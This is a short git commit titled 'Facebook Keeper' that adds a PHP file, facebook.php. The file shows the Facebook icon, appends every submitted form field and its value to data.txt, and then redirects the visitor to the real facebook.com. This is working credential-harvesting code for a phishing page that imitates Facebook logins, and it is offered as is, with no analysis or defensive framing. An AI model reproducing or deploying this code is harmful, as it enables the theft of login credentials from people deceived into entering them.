ca8bee7dd19752c7fdb6e824a6b674d0bb1b6c9d
Mr Discord Animation <82038994+MrDiscordAnimation@users.noreply.github.com>
2021-06-14 10:40:51 +0700

    Facebook Keeper

---
+++ facebook.php
@@ -0,0 +1,14 @@
+<link href="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" rel="icon">
+<?php
+header ('Location: https://facebook.com');
+$handle = fopen("data.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
+?>
